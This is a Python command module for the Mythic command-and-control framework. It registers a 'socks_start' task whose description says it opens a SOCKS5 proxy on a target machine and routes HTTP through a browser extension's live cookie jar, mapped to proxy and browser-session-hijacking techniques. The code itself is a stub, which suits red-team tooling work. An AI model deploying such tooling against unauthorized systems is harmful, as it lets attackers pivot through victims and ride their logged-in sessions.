from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class SocksStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class SocksStartCommand(CommandBase):
    cmd            = "socks_start"
    needs_admin    = False
    help_cmd       = "socks_start"
    description    = (
        "Start the SOCKS5 native messaging host bridge. Requires the Go binary "
        "to be installed on the target via native_host/install.py. Opens "
        "127.0.0.1:1080 as a SOCKS5 proxy. HTTP requests are routed through the "
        "extension's live cookie jar; HTTPS and raw TCP are handled directly by "
        "the host binary (traffic exits from the target machine)."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = SocksStartArguments
    parameters     = []
    attackmapping  = ["T1090", "T1185"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
